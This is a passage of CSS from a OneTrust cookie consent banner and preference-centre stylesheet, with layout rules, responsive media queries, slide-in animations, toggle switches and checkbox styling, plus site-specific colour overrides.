        #onetrust-pc-sdk input[type="submit"].ot-sdk-button-primary:hover,
        #onetrust-pc-sdk input[type="reset"].ot-sdk-button-primary:hover,
        #onetrust-pc-sdk input[type="button"].ot-sdk-button-primary:hover,
        #onetrust-pc-sdk .ot-sdk-button.ot-sdk-button-primary:focus,
        #onetrust-pc-sdk button.ot-sdk-button-primary:focus,
        #onetrust-pc-sdk input[type="submit"].ot-sdk-button-primary:focus,
        #onetrust-pc-sdk input[type="reset"].ot-sdk-button-primary:focus,
        #onetrust-pc-sdk input[type="button"].ot-sdk-button-primary:focus,
        #ot-sdk-cookie-policy .ot-sdk-button.ot-sdk-button-primary:hover,
        #ot-sdk-cookie-policy button.ot-sdk-button-primary:hover,
        #ot-sdk-cookie-policy input[type="submit"].ot-sdk-button-primary:hover,
        #ot-sdk-cookie-policy input[type="reset"].ot-sdk-button-primary:hover,
        #ot-sdk-cookie-policy input[type="button"].ot-sdk-button-primary:hover,
        #ot-sdk-cookie-policy .ot-sdk-button.ot-sdk-button-primary:focus,
        #ot-sdk-cookie-policy button.ot-sdk-button-primary:focus,
        #ot-sdk-cookie-policy input[type="submit"].ot-sdk-button-primary:focus,
        #ot-sdk-cookie-policy input[type="reset"].ot-sdk-button-primary:focus,
        #ot-sdk-cookie-policy input[type="button"].ot-sdk-button-primary:focus {
            color: #fff;
            background-color: #1eaedb;
            border-color: #1eaedb
        }
        
        #onetrust-banner-sdk input[type="text"],
        #onetrust-pc-sdk input[type="text"],
        #ot-sdk-cookie-policy input[type="text"] {
            height: 38px;
            padding: 6px 10px;
            background-color: #fff;
            border: 1px solid #d1d1d1;
            border-radius: 4px;
            box-shadow: none;
            box-sizing: border-box
        }
        
        #onetrust-banner-sdk input[type="text"],
        #onetrust-pc-sdk input[type="text"],
        #ot-sdk-cookie-policy input[type="text"] {
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none
        }
        
        #onetrust-banner-sdk input[type="text"]:focus,
        #onetrust-pc-sdk input[type="text"]:focus,
        #ot-sdk-cookie-policy input[type="text"]:focus {
            border: 1px solid #000;
            outline: 0
        }
        
        #onetrust-banner-sdk label,
        #onetrust-pc-sdk label,
        #ot-sdk-cookie-policy label {
            display: block;
            margin-bottom: 0.5rem;
            font-weight: 600
        }
        
        #onetrust-banner-sdk input[type="checkbox"],
        #onetrust-pc-sdk input[type="checkbox"],
        #ot-sdk-cookie-policy input[type="checkbox"] {
            display: inline
        }
        
        #onetrust-banner-sdk ul,
        #onetrust-pc-sdk ul,
        #ot-sdk-cookie-policy ul {
            list-style: circle inside
        }
        
        #onetrust-banner-sdk ul,
        #onetrust-pc-sdk ul,
        #ot-sdk-cookie-policy ul {
            padding-left: 0;
            margin-top: 0
        }
        
        #onetrust-banner-sdk ul ul,
        #onetrust-pc-sdk ul ul,
        #ot-sdk-cookie-policy ul ul {
            margin: 1.5rem 0 1.5rem 3rem;
            font-size: 90%
        }
        
        #onetrust-banner-sdk li,
        #onetrust-pc-sdk li,
        #ot-sdk-cookie-policy li {
            margin-bottom: 1rem
        }
        
        #onetrust-banner-sdk th,
        #onetrust-banner-sdk td,
        #onetrust-pc-sdk th,
        #onetrust-pc-sdk td,
        #ot-sdk-cookie-policy th,
        #ot-sdk-cookie-policy td {
            padding: 12px 15px;
            text-align: left;
            border-bottom: 1px solid #e1e1e1
        }
        
        #onetrust-banner-sdk button,
        #onetrust-pc-sdk button,
        #ot-sdk-cookie-policy button {
            margin-bottom: 1rem;
            font-family: inherit
        }
        
        #onetrust-banner-sdk .ot-sdk-container:after,
        #onetrust-banner-sdk .ot-sdk-row:after,
        #onetrust-pc-sdk .ot-sdk-container:after,
        #onetrust-pc-sdk .ot-sdk-row:after,
        #ot-sdk-cookie-policy .ot-sdk-container:after,
        #ot-sdk-cookie-policy .ot-sdk-row:after {
            content: "";
            display: table;
            clear: both
        }
        
        #onetrust-banner-sdk .ot-sdk-row,
        #onetrust-pc-sdk .ot-sdk-row,
        #ot-sdk-cookie-policy .ot-sdk-row {
            margin: 0;
            max-width: none;
            display: block
        }
        
        #onetrust-banner-sdk {
            box-shadow: 0 0 18px rgba(0, 0, 0, .2)
        }
        
        #onetrust-banner-sdk.otFlat {
            position: fixed;
            z-index: 2147483645;
            bottom: 0;
            right: 0;
            left: 0;
            background-color: #fff;
            max-height: 90%;
            overflow-x: hidden;
            overflow-y: auto
        }
        
        #onetrust-banner-sdk.otFlat.top {
            top: 0px;
            bottom: auto
        }
        
        #onetrust-banner-sdk.otRelFont {
            font-size: 1rem
        }
        
        #onetrust-banner-sdk>.ot-sdk-container {
            overflow: hidden
        }
        
        #onetrust-banner-sdk::-webkit-scrollbar {
            width: 11px
        }
        
        #onetrust-banner-sdk::-webkit-scrollbar-thumb {
            border-radius: 10px;
            background: #c1c1c1
        }
        
        #onetrust-banner-sdk {
            scrollbar-arrow-color: #c1c1c1;
            scrollbar-darkshadow-color: #c1c1c1;
            scrollbar-face-color: #c1c1c1;
            scrollbar-shadow-color: #c1c1c1
        }
        
        #onetrust-banner-sdk #onetrust-policy {
            margin: 1.25em 0 .625em 2em;
            overflow: hidden
        }
        
        #onetrust-banner-sdk #onetrust-policy .ot-gv-list-handler {
            float: left;
            font-size: .82em;
            padding: 0;
            margin-bottom: 0;
            border: 0;
            line-height: normal;
            height: auto;
            width: auto
        }
        
        #onetrust-banner-sdk #onetrust-policy-title {
            font-size: 1.2em;
            line-height: 1.3;
            margin-bottom: 10px
        }
        
        #onetrust-banner-sdk #onetrust-policy-text {
            clear: both;
            text-align: left;
            font-size: .88em;
            line-height: 1.4
        }
        
        #onetrust-banner-sdk #onetrust-policy-text * {
            font-size: inherit;
            line-height: inherit
        }
        
        #onetrust-banner-sdk #onetrust-policy-text a {
            font-weight: bold;
            margin-left: 5px
        }
        
        #onetrust-banner-sdk #onetrust-policy-title,
        #onetrust-banner-sdk #onetrust-policy-text {
            color: dimgray;
            float: left
        }
        
        #onetrust-banner-sdk #onetrust-button-group-parent {
            min-height: 1px;
            text-align: center
        }
        
        #onetrust-banner-sdk #onetrust-button-group {
            display: inline-block
        }
        
        #onetrust-banner-sdk #onetrust-accept-btn-handler,
        #onetrust-banner-sdk #onetrust-reject-all-handler,
        #onetrust-banner-sdk #onetrust-pc-btn-handler {
            background-color: #68b631;
            color: #fff;
            border-color: #68b631;
            margin-right: 1em;
            min-width: 125px;
            height: auto;
            white-space: normal;
            word-break: break-word;
            word-wrap: break-word;
            padding: 12px 10px;
            line-height: 1.2;
            font-size: .813em;
            font-weight: 600
        }
        
        #onetrust-banner-sdk #onetrust-pc-btn-handler.cookie-setting-link {
            background-color: #fff;
            border: none;
            color: #68b631;
            text-decoration: underline;
            padding-left: 0;
            padding-right: 0
        }
        
        #onetrust-banner-sdk .onetrust-close-btn-ui {
            width: 44px;
            height: 44px;
            background-size: 12px;
            border: none;
            position: relative;
            margin: auto;
            padding: 0
        }
        
        #onetrust-banner-sdk .banner_logo {
            display: none
        }
        
        #onetrust-banner-sdk.ot-bnr-w-logo .ot-bnr-logo {
            position: absolute;
            top: 50%;
            transform: translateY(-50%);
            left: 0px
        }
        
        #onetrust-banner-sdk.ot-bnr-w-logo #onetrust-policy {
            margin-left: 65px
        }
        
        #onetrust-banner-sdk .ot-b-addl-desc {
            clear: both;
            float: left;
            display: block
        }
        
        #onetrust-banner-sdk #banner-options {
            float: left;
            display: table;
            margin-right: 0;
            margin-left: 1em;
            width: calc(100% - 1em)
        }
        
        #onetrust-banner-sdk .banner-option-input {
            cursor: pointer;
            width: auto;
            height: auto;
            border: none;
            padding: 0;
            padding-right: 3px;
            margin: 0 0 10px;
            font-size: .82em;
            line-height: 1.4
        }
        
        #onetrust-banner-sdk .banner-option-input * {
            pointer-events: none;
            font-size: inherit;
            line-height: inherit
        }
        
        #onetrust-banner-sdk .banner-option-input[aria-expanded=true]~.banner-option-details {
            display: block;
            height: auto
        }
        
        #onetrust-banner-sdk .banner-option-input[aria-expanded=true] .ot-arrow-container {
            transform: rotate(90deg)
        }
        
        #onetrust-banner-sdk .banner-option {
            margin-bottom: 12px;
            margin-left: 0;
            border: none;
            float: left;
            padding: 0
        }
        
        #onetrust-banner-sdk .banner-option:first-child {
            padding-left: 2px
        }
        
        #onetrust-banner-sdk .banner-option:not(:first-child) {
            padding: 0;
            border: none
        }
        
        #onetrust-banner-sdk .banner-option-header {
            cursor: pointer;
            display: inline-block
        }
        
        #onetrust-banner-sdk .banner-option-header :first-child {
            color: dimgray;
            font-weight: bold;
            float: left
        }
        
        #onetrust-banner-sdk .banner-option-header .ot-arrow-container {
            display: inline-block;
            border-top: 6px solid transparent;
            border-bottom: 6px solid transparent;
            border-left: 6px solid dimgray;
            margin-left: 10px;
            vertical-align: middle
        }
        
        #onetrust-banner-sdk .banner-option-details {
            display: none;
            font-size: .83em;
            line-height: 1.5;
            padding: 10px 0px 5px 10px;
            margin-right: 10px;
            height: 0px
        }
        
        #onetrust-banner-sdk .banner-option-details * {
            font-size: inherit;
            line-height: inherit;
            color: dimgray
        }
        
        #onetrust-banner-sdk .ot-arrow-container,
        #onetrust-banner-sdk .banner-option-details {
            transition: all 300ms ease-in 0s;
            -webkit-transition: all 300ms ease-in 0s;
            -moz-transition: all 300ms ease-in 0s;
            -o-transition: all 300ms ease-in 0s
        }
        
        #onetrust-banner-sdk .ot-dpd-container {
            float: left
        }
        
        #onetrust-banner-sdk .ot-dpd-title {
            margin-bottom: 10px
        }
        
        #onetrust-banner-sdk .ot-dpd-title,
        #onetrust-banner-sdk .ot-dpd-desc {
            font-size: .88em;
            line-height: 1.4;
            color: dimgray
        }
        
        #onetrust-banner-sdk .ot-dpd-title *,
        #onetrust-banner-sdk .ot-dpd-desc * {
            font-size: inherit;
            line-height: inherit
        }
        
        #onetrust-banner-sdk.ot-iab-2 #onetrust-policy-text * {
            margin-bottom: 0
        }
        
        #onetrust-banner-sdk.ot-iab-2 .onetrust-vendors-list-handler {
            display: block;
            margin-left: 0;
            margin-top: 5px;
            clear: both;
            margin-bottom: 0;
            padding: 0;
            border: 0;
            height: auto;
            width: auto
        }
        
        #onetrust-banner-sdk.ot-iab-2 #onetrust-button-group button {
            display: block
        }
        
        #onetrust-banner-sdk.ot-close-btn-link {
            padding-top: 25px
        }
        
        #onetrust-banner-sdk.ot-close-btn-link #onetrust-close-btn-container {
            top: 15px;
            transform: none;
            right: 15px
        }
        
        #onetrust-banner-sdk.ot-close-btn-link #onetrust-close-btn-container button {
            padding: 0;
            white-space: pre-wrap;
            border: none;
            height: auto;
            line-height: 1.5;
            text-decoration: underline;
            font-size: .69em
        }
        
        #onetrust-banner-sdk #onetrust-policy-text,
        #onetrust-banner-sdk .ot-dpd-desc,
        #onetrust-banner-sdk .ot-b-addl-desc {
            font-size: .813em;
            line-height: 1.5
        }
        
        #onetrust-banner-sdk .ot-dpd-desc {
            margin-bottom: 10px
        }
        
        #onetrust-banner-sdk .ot-dpd-desc>.ot-b-addl-desc {
            margin-top: 10px;
            margin-bottom: 10px;
            font-size: 1em
        }
        
        @media only screen and (max-width: 425px) {
            #onetrust-banner-sdk #onetrust-close-btn-container {
                position: absolute;
                top: 6px;
                right: 2px
            }
            #onetrust-banner-sdk #onetrust-policy {
                margin-left: 0;
                margin-top: 3em
            }
            #onetrust-banner-sdk #onetrust-button-group {
                display: block
            }
            #onetrust-banner-sdk #onetrust-accept-btn-handler,
            #onetrust-banner-sdk #onetrust-reject-all-handler,
            #onetrust-banner-sdk #onetrust-pc-btn-handler {
                width: 100%
            }
            #onetrust-banner-sdk .onetrust-close-btn-ui {
                top: auto;
                transform: none
            }
            #onetrust-banner-sdk #onetrust-policy-title {
                display: inline;
                float: none
            }
            #onetrust-banner-sdk #banner-options {
                margin: 0;
                padding: 0;
                width: 100%
            }
        }
        
        @media only screen and (min-width: 426px)and (max-width: 896px) {
            #onetrust-banner-sdk #onetrust-close-btn-container {
                position: absolute;
                top: 0;
                right: 0
            }
            #onetrust-banner-sdk #onetrust-policy {
                margin-left: 1em;
                margin-right: 1em
            }
            #onetrust-banner-sdk .onetrust-close-btn-ui {
                top: 10px;
                right: 10px
            }
            #onetrust-banner-sdk:not(.ot-iab-2) #onetrust-group-container {
                width: 95%
            }
            #onetrust-banner-sdk.ot-iab-2 #onetrust-group-container {
                width: 100%
            }
            #onetrust-banner-sdk.ot-bnr-w-logo #onetrust-button-group-parent {
                padding-left: 50px
            }
            #onetrust-banner-sdk #onetrust-button-group-parent {
                width: 100%;
                position: relative;
                margin-left: 0
            }
            #onetrust-banner-sdk #onetrust-button-group button {
                display: inline-block
            }
            #onetrust-banner-sdk #onetrust-button-group {
                margin-right: 0;
                text-align: center
            }
            #onetrust-banner-sdk .has-reject-all-button #onetrust-pc-btn-handler {
                float: left
            }
            #onetrust-banner-sdk .has-reject-all-button #onetrust-reject-all-handler,
            #onetrust-banner-sdk .has-reject-all-button #onetrust-accept-btn-handler {
                float: right
            }
            #onetrust-banner-sdk .has-reject-all-button #onetrust-button-group {
                width: calc(100% - 2em);
                margin-right: 0
            }
            #onetrust-banner-sdk .has-reject-all-button #onetrust-pc-btn-handler.cookie-setting-link {
                padding-left: 0px;
                text-align: left
            }
            #onetrust-banner-sdk.ot-buttons-fw .ot-sdk-three button {
                width: 100%;
                text-align: center
            }
            #onetrust-banner-sdk.ot-buttons-fw #onetrust-button-group-parent button {
                float: none
            }
            #onetrust-banner-sdk.ot-buttons-fw #onetrust-pc-btn-handler.cookie-setting-link {
                text-align: center
            }
        }
        
        @media only screen and (min-width: 550px) {
            #onetrust-banner-sdk .banner-option:not(:first-child) {
                border-left: 1px solid #d8d8d8;
                padding-left: 25px
            }
        }
        
        @media only screen and (min-width: 425px)and (max-width: 550px) {
            #onetrust-banner-sdk.ot-iab-2 #onetrust-button-group,
            #onetrust-banner-sdk.ot-iab-2 #onetrust-policy,
            #onetrust-banner-sdk.ot-iab-2 .banner-option {
                width: 100%
            }
        }
        
        @media only screen and (min-width: 769px) {
            #onetrust-banner-sdk #onetrust-button-group {
                margin-right: 30%
            }
            #onetrust-banner-sdk #banner-options {
                margin-left: 2em;
                margin-right: 5em;
                margin-bottom: 1.25em;
                width: calc(100% - 7em)
            }
        }
        
        @media only screen and (min-width: 897px)and (max-width: 1023px) {
            #onetrust-banner-sdk.vertical-align-content #onetrust-button-group-parent {
                position: absolute;
                top: 50%;
                left: 75%;
                transform: translateY(-50%)
            }
            #onetrust-banner-sdk #onetrust-close-btn-container {
                top: 50%;
                margin: auto;
                transform: translate(-50%, -50%);
                position: absolute;
                padding: 0;
                right: 0
            }
            #onetrust-banner-sdk #onetrust-close-btn-container button {
                position: relative;
                margin: 0;
                right: -22px;
                top: 2px
            }
        }
        
        @media only screen and (min-width: 1024px) {
            #onetrust-banner-sdk #onetrust-close-btn-container {
                top: 50%;
                margin: auto;
                transform: translate(-50%, -50%);
                position: absolute;
                right: 0
            }
            #onetrust-banner-sdk #onetrust-close-btn-container button {
                right: -12px
            }
            #onetrust-banner-sdk #onetrust-policy {
                margin-left: 2em
            }
            #onetrust-banner-sdk.vertical-align-content #onetrust-button-group-parent {
                position: absolute;
                top: 50%;
                left: 60%;
                transform: translateY(-50%)
            }
            #onetrust-banner-sdk.ot-iab-2 #onetrust-policy-title {
                width: 50%
            }
            #onetrust-banner-sdk.ot-iab-2 #onetrust-policy-text,
            #onetrust-banner-sdk.ot-iab-2 :not(.ot-dpd-desc)>.ot-b-addl-desc {
                margin-bottom: 1em;
                width: 50%;
                border-right: 1px solid #d8d8d8;
                padding-right: 1rem
            }
            #onetrust-banner-sdk.ot-iab-2 #onetrust-policy-text {
                margin-bottom: 0;
                padding-bottom: 1em
            }
            #onetrust-banner-sdk.ot-iab-2 :not(.ot-dpd-desc)>.ot-b-addl-desc {
                margin-bottom: 0;
                padding-bottom: 1em
            }
            #onetrust-banner-sdk.ot-iab-2 .ot-dpd-container {
                width: 45%;
                padding-left: 1rem;
                display: inline-block;
                float: none
            }
            #onetrust-banner-sdk.ot-iab-2 .ot-dpd-title {
                line-height: 1.7
            }
            #onetrust-banner-sdk.ot-iab-2 #onetrust-button-group-parent {
                left: auto;
                right: 4%;
                margin-left: 0
            }
            #onetrust-banner-sdk.ot-iab-2 #onetrust-button-group button {
                display: block
            }
            #onetrust-banner-sdk:not(.ot-iab-2) #onetrust-button-group-parent {
                margin: auto;
                width: 30%
            }
            #onetrust-banner-sdk:not(.ot-iab-2) #onetrust-group-container {
                width: 60%
            }
            #onetrust-banner-sdk #onetrust-button-group {
                margin-right: auto
            }
            #onetrust-banner-sdk #onetrust-accept-btn-handler,
            #onetrust-banner-sdk #onetrust-reject-all-handler,
            #onetrust-banner-sdk #onetrust-pc-btn-handler {
                margin-top: 1em
            }
        }
        
        @media only screen and (min-width: 890px) {
            #onetrust-banner-sdk.ot-buttons-fw:not(.ot-iab-2) #onetrust-button-group-parent {
                padding-left: 3%;
                padding-right: 4%;
                margin-left: 0
            }
            #onetrust-banner-sdk.ot-buttons-fw:not(.ot-iab-2) #onetrust-button-group {
                margin-right: 0;
                margin-top: 1.25em;
                width: 100%
            }
            #onetrust-banner-sdk.ot-buttons-fw:not(.ot-iab-2) #onetrust-button-group button {
                width: 100%;
                margin-bottom: 5px;
                margin-top: 5px
            }
            #onetrust-banner-sdk.ot-buttons-fw:not(.ot-iab-2) #onetrust-button-group button:last-of-type {
                margin-bottom: 20px
            }
        }
        
        @media only screen and (min-width: 1280px) {
            #onetrust-banner-sdk:not(.ot-iab-2) #onetrust-group-container {
                width: 55%
            }
            #onetrust-banner-sdk:not(.ot-iab-2) #onetrust-button-group-parent {
                width: 44%;
                padding-left: 2%;
                padding-right: 2%
            }
            #onetrust-banner-sdk:not(.ot-iab-2).vertical-align-content #onetrust-button-group-parent {
                position: absolute;
                left: 55%
            }
        }
        
        #onetrust-consent-sdk #onetrust-banner-sdk {
            background-color: #333333;
        }
        
        #onetrust-consent-sdk #onetrust-policy-title,
        #onetrust-consent-sdk #onetrust-policy-text,
        #onetrust-consent-sdk .ot-b-addl-desc,
        #onetrust-consent-sdk .ot-dpd-desc,
        #onetrust-consent-sdk .ot-dpd-title,
        #onetrust-consent-sdk #onetrust-policy-text *:not(.onetrust-vendors-list-handler),
        #onetrust-consent-sdk .ot-dpd-desc *:not(.onetrust-vendors-list-handler),
        #onetrust-consent-sdk #onetrust-banner-sdk #banner-options *,
        #onetrust-banner-sdk .ot-cat-header {
            color: #FFFFFF;
        }
        
        #onetrust-consent-sdk #onetrust-banner-sdk .banner-option-details {
            background-color: #E9E9E9;
        }
        
        #onetrust-consent-sdk #onetrust-banner-sdk a[href],
        #onetrust-consent-sdk #onetrust-banner-sdk a[href] font,
        #onetrust-consent-sdk #onetrust-banner-sdk .ot-link-btn {
            color: #FFFFFF;
        }
        
        #onetrust-consent-sdk #onetrust-accept-btn-handler,
        #onetrust-banner-sdk #onetrust-reject-all-handler {
            background-color: #D40511;
            border-color: #D40511;
            color: #FFFFFF;
        }
        
        #onetrust-consent-sdk #onetrust-banner-sdk *:focus,
        #onetrust-consent-sdk #onetrust-banner-sdk:focus {
            outline-color: #FFFFFF;
            outline-width: 1px;
        }
        
        #onetrust-consent-sdk #onetrust-pc-btn-handler,
        #onetrust-consent-sdk #onetrust-pc-btn-handler.cookie-setting-link {
            color: #FFFFFF;
            border-color: #FFFFFF;
            background-color: #D40511;
        }
        
        #onetrust-banner-sdk .ot-sdk-row,
        #onetrust-pc-sdk .ot-sdk-row,
        #ot-sdk-cookie-policy .ot-sdk-row {
            font-size: 15px!important;
        }
        
        #onetrust-pc-btn-handler {
            border-color: #D40511 !important;
        }
        
        #onetrust-consent-sdk #onetrust-banner-sdk a[href],
        #onetrust-consent-sdk #onetrust-banner-sdk a[href] font,
        #onetrust-consent-sdk #onetrust-banner-sdk .ot-link-btn {
            color: #ffffff !important;
        }
        
        #onetrust-consent-sdk #onetrust-banner-sdk a[href] {
            font-weight: normal;
        }
        
        #onetrust-consent-sdk #onetrust-banner-sdk a[href]:hover {
            color: #D40511 !important;
        }
        
        #onetrust-pc-sdk #ot-pc-content.ot-pc-scrollbar {
            bottom: 74px;
        }
        
        #onetrust-banner-sdk #onetrust-policy {
            padding-right: 20px;
        }
        
        #onetrust-policy-text a {
            text-decoration: underline !important;
        }
        
        #onetrust-policy-text a:hover {
            text-decoration: none !important;
        }
        
        @keyframes ot-slide-in-left {
            from {
                -webkit-transform: translate3d(-100%, 0, 0);
                transform: translate3d(-100%, 0, 0)
            }
            to {
                -webkit-transform: translate3d(0, 0, 0);
                transform: translate3d(0, 0, 0)
            }
        }
        
        @keyframes ot-slide-in-right {
            from {
                -webkit-transform: translate3d(100%, 0, 0);
                transform: translate3d(100%, 0, 0)
            }
            to {
                -webkit-transform: translate3d(0, 0, 0);
                transform: translate3d(0, 0, 0)
            }
        }
        
        @keyframes ot-slide-out-left {
            from {
                -webkit-transform: translate3d(0, 0, 0);
                transform: translate3d(0, 0, 0)
            }
            to {
                -webkit-transform: translate3d(-100%, 0, 0);
                transform: translate3d(-100%, 0, 0)
            }
        }
        
        @keyframes ot-slide-out-right {
            from {
                -webkit-transform: translate3d(0, 0, 0);
                transform: translate3d(0, 0, 0)
            }
            to {
                -webkit-transform: translate3d(100%, 0, 0);
                transform: translate3d(100%, 0, 0)
            }
        }
        
        #onetrust-pc-sdk.otPcPanel.ot-slide-out-right {
            -webkit-animation-name: ot-slide-out-right;
            animation-name: ot-slide-out-right
        }
        
        #onetrust-pc-sdk.otPcPanel.ot-slide-in-left {
            -webkit-animation-name: ot-slide-in-left;
            animation-name: ot-slide-in-left
        }
        
        #onetrust-pc-sdk.otPcPanel.ot-slide-in-right {
            -webkit-animation-name: ot-slide-in-right;
            animation-name: ot-slide-in-right
        }
        
        #onetrust-pc-sdk.otPcPanel.ot-slide-out-left {
            -webkit-animation-name: ot-slide-out-left;
            animation-name: ot-slide-out-left
        }
        
        @media print,
        (prefers-reduced-motion) {
            .ot-animated {
                -webkit-animation: initial !important;
                animation: initial !important;
                -webkit-transition: none !important;
                transition: none !important
            }
            #onetrust-pc-sdk.otPcPanel.ot-slide-out-left {
                -webkit-transform: translate3d(-100%, 0, 0);
                transform: translate3d(-100%, 0, 0)
            }
            #onetrust-pc-sdk.otPcPanel.ot-slide-out-right {
                -webkit-transform: translate3d(100%, 0, 0);
                transform: translate3d(100%, 0, 0)
            }
        }
        
        #onetrust-pc-sdk {
            position: fixed;
            z-index: 2147483647;
            bottom: 0;
            left: 0;
            background-color: #fff;
            max-width: 480px;
            min-width: 480px;
            height: 100%;
            -webkit-box-shadow: 0px 2px 10px -3px #999;
            -moz-box-shadow: 0px 2px 10px -3px #999;
            box-shadow: 0px 2px 10px -3px #999
        }
        
        #onetrust-pc-sdk.otRelFont {
            font-size: 1rem
        }
        
        #onetrust-pc-sdk.otPcPanel.right,
        #onetrust-pc-sdk.otPcPanel[dir=rtl] {
            right: 0;
            left: auto
        }
        
        #onetrust-pc-sdk.otPcPanel.right-rtl[dir=rtl] {
            left: 0;
            right: auto
        }
        
        #onetrust-pc-sdk.otPcPanel.ot-animated {
            -webkit-animation-duration: 1s;
            animation-duration: 1s;
            -webkit-animation-fill-mode: both;
            animation-fill-mode: both
        }
        
        #onetrust-pc-sdk #close-pc-btn-handler.ot-close-icon {
            background-color: transparent;
            border: none
        }
        
        #onetrust-pc-sdk .ot-pc-scrollbar::-webkit-scrollbar-track {
            margin-right: 20px
        }
        
        #onetrust-pc-sdk .ot-pc-scrollbar::-webkit-scrollbar {
            width: 11px
        }
        
        #onetrust-pc-sdk .ot-pc-scrollbar::-webkit-scrollbar-thumb {
            border-radius: 10px;
            background: #d8d8d8
        }
        
        #onetrust-pc-sdk .ot-pc-scrollbar {
            scrollbar-arrow-color: #d8d8d8;
            scrollbar-darkshadow-color: #d8d8d8;
            scrollbar-face-color: #d8d8d8;
            scrollbar-shadow-color: #d8d8d8
        }
        
        #onetrust-pc-sdk.ot-ftr-stacked .ot-pc-refuse-all-handler {
            margin-bottom: 0px
        }
        
        #onetrust-pc-sdk.ot-ftr-stacked #ot-pc-content {
            bottom: 160px
        }
        
        #onetrust-pc-sdk.ot-ftr-stacked .ot-pc-footer button {
            width: 100%;
            max-width: none
        }
        
        #onetrust-pc-sdk.ot-ftr-stacked #ot-lst-cnt {
            max-height: 84%
        }
        
        #onetrust-pc-sdk #ot-addtl-venlst .ot-arw-cntr,
        #onetrust-pc-sdk #ot-addtl-venlst .ot-plus-minus,
        #onetrust-pc-sdk .ot-hide-tgl {
            visibility: hidden
        }
        
        #onetrust-pc-sdk #ot-addtl-venlst .ot-arw-cntr *,
        #onetrust-pc-sdk #ot-addtl-venlst .ot-plus-minus *,
        #onetrust-pc-sdk .ot-hide-tgl * {
            visibility: hidden
        }
        
        #onetrust-pc-sdk .ot-pc-header {
            height: 39px;
            border-bottom: 1px solid #e9e9e9;
            padding: 10px 0 10px 25px
        }
        
        #onetrust-pc-sdk .ot-pc-logo {
            height: 40px;
            width: 120px;
            display: inline-block
        }
        
        #onetrust-pc-sdk .ot-close-icon {
            float: right;
            height: 10px;
            width: 10px;
            margin-top: 10px;
            margin-right: 5px
        }
        
        #onetrust-pc-sdk #ot-pc-content,
        #onetrust-pc-sdk #ot-pc-lst {
            position: absolute;
            top: 60px;
            bottom: 104px
        }
        
        #onetrust-pc-sdk #ot-pc-content {
            padding-left: 2px;
            padding-right: 10px;
            margin-left: 23px;
            margin-right: 7px;
            width: calc(100% - 42px);
            overflow-y: auto
        }
        
        #onetrust-pc-sdk #ot-pc-lst {
            width: 100%
        }
        
        #onetrust-pc-sdk .ot-pc-footer {
            position: absolute;
            bottom: 0px;
            width: 100%;
            max-height: 160px;
            border-top: 1px solid #d8d8d8
        }
        
        #onetrust-pc-sdk .ot-pc-footer button {
            margin-top: 19px
        }
        
        #onetrust-pc-sdk .ot-btn-container {
            text-align: left;
            margin-left: 25px;
            margin-right: 25px
        }
        
        #onetrust-pc-sdk .ot-btn-container button {
            min-width: calc(50% - 5px)
        }
        
        #onetrust-pc-sdk .ot-pc-footer-logo {
            padding-left: 25px;
            height: 30px;
            background: #f4f4f4;
            text-align: right
        }
        
        #onetrust-pc-sdk .ot-pc-footer-logo a {
            display: inline-block;
            margin-top: 5px;
            margin-right: 10px
        }
        
        #onetrust-pc-sdk.otPcPanel[dir=rtl] .ot-pc-footer-logo {
            direction: rtl
        }
        
        #onetrust-pc-sdk.otPcPanel[dir=rtl] .ot-pc-footer-logo a {
            margin-right: 25px
        }
        
        #onetrust-pc-sdk button {
            display: inline-block;
            font-size: .75em;
            letter-spacing: .08em;
            max-width: 394px;
            padding: 12px 30px;
            line-height: 1;
            word-break: break-word;
            word-wrap: break-word;
            white-space: normal;
            font-weight: bold;
            height: auto
        }
        
        #onetrust-pc-sdk button:hover,
        #onetrust-pc-sdk button:focus {
            color: #fff;
            border-color: #68b631
        }
        
        #onetrust-pc-sdk .ot-link-btn {
            padding: 0;
            margin-bottom: 0;
            border: 0;
            font-weight: normal;
            line-height: normal;
            width: auto;
            height: auto
        }
        
        #onetrust-pc-sdk #accept-recommended-btn-handler {
            margin-right: 10px;
            margin-bottom: 25px
        }
        
        #onetrust-pc-sdk .ot-pc-refuse-all-handler {
            margin-right: 5px
        }
        
        #onetrust-pc-sdk .ot-tgl {
            float: right;
            position: relative;
            z-index: 1
        }
        
        #onetrust-pc-sdk .ot-tgl input:checked+.ot-switch .ot-switch-nob {
            background-color: #d5e9ff;
            border: 1px solid #3860be
        }
        
        #onetrust-pc-sdk .ot-tgl input:checked+.ot-switch .ot-switch-nob:before {
            -webkit-transform: translateX(21px);
            -ms-transform: translateX(21px);
            transform: translateX(21px);
            background-color: #3860be
        }
        
        #onetrust-pc-sdk .ot-tgl input:focus+.ot-switch .ot-switch-nob {
            box-shadow: 0 0 1px #2196f3;
            outline-style: auto !important;
            outline-width: 1px !important
        }
        
        #onetrust-pc-sdk .ot-switch {
            position: relative;
            display: inline-block;
            width: 45px;
            height: 25px;
            margin-bottom: 0
        }
        
        #onetrust-pc-sdk .ot-switch-nob {
            position: absolute;
            cursor: pointer;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: #f2f1f1;
            border: 1px solid #ddd;
            transition: all .2s ease-in 0s;
            -moz-transition: all .2s ease-in 0s;
            -o-transition: all .2s ease-in 0s;
            -webkit-transition: all .2s ease-in 0s;
            border-radius: 20px
        }
        
        #onetrust-pc-sdk .ot-switch-nob:before {
            position: absolute;
            content: "";
            height: 21px;
            width: 21px;
            bottom: 1px;
            background-color: #7d7d7d;
            -webkit-transition: .4s;
            transition: .4s;
            border-radius: 20px
        }
        
        #onetrust-pc-sdk .ot-chkbox {
            z-index: 1
        }
        
        #onetrust-pc-sdk .ot-chkbox input:checked~label::before {
            background-color: #3860be
        }
        
        #onetrust-pc-sdk .ot-chkbox input+label::after {
            content: none;
            color: #fff
        }
        
        #onetrust-pc-sdk .ot-chkbox input:checked+label::after {
            content: ""
        }
        
        #onetrust-pc-sdk .ot-chkbox input:focus+label::before {
            outline-style: solid;
            outline-width: 2px;
            outline-style: auto
        }
        
        #onetrust-pc-sdk .ot-chkbox label {
            position: relative;
            display: inline-block;
            cursor: pointer
        }
        
        #onetrust-pc-sdk .ot-chkbox label::before,
        #onetrust-pc-sdk .ot-chkbox label::after {
            position: absolute;
            content: "";
            display: inline-block;
            border-radius: 3px
        }
        
        #onetrust-pc-sdk .ot-chkbox label::before {
            height: 18px;
            width: 18px;
            border: 1px solid #3860be;
            left: 0px
        }
        
        #onetrust-pc-sdk .ot-chkbox label::after {
            height: 5px;
            width: 9px;
            border-left: 3px solid;
            border-bottom: 3px solid;
            transform: rotate(-45deg);
